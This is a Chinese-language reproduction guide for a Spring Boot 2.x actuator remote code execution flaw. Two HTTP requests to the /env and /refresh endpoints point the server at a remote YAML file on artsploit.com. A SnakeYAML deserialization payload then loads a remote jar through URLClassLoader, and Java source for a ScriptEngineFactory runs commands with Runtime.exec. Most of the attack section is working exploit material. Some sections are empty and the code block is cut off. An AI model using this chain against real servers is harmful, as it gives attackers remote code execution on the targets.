Spring Boot 修改环境属性导致的rce
=================================

一、漏洞简介
------------

二、漏洞影响
------------

Spring Boot 2.x

三、复现过程
------------

环境下载 https://github.com/ianxtianxt/actuator-testbed

    POST /env HTTP/1.1
    Host: 127.0.0.1:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
     
    spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml

该请求修改了"
spring.cloud.bootstrap.location"属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用"
 refresh"端点。

    POST /refresh HTTP/1.1
    Host: 127.0.0.1:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0

从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
      ]]
    ]

该文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。简而言之，它导致了\*\*\'java.util.ServiceLoader＃load（java.lang.Class
，java.lang.ClassLoader）\'\*\*方法，该方法试图在所有库中查找\'ScriptEngineFactory\'接口的所有实现。在类路径中。由于我们可以通过URLClassLoader添加新的库，因此我们可以在其中包含恶意字节码的情况下为新的\'ScriptEngineFactory\'提供服务。为此，我们需要使用以下必需文件创建一个jar归档文件：https://github.com/ianxtianxt/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java应该包含实际的字节码，并在构造函数中带有恶意负载。

    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
     
        public AwesomeScriptEngineFactory() {
            try {
                Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
                Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
                e.printStackTrace();
            }

https://github.com/ianxtianxt/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory应该只是一个包含对\'artsploit.AwesomeScriptEngineFactory\'的完整引用的文本文件，以便ServiceLoader知道在哪里可以找到该类：**artsploit.AwesomeScriptEngineFactory**同样，这种利用技术要求弹簧云位于类路径中，但是与Eureka的XStream有效负载相比，它甚至可以在最新版本中使用
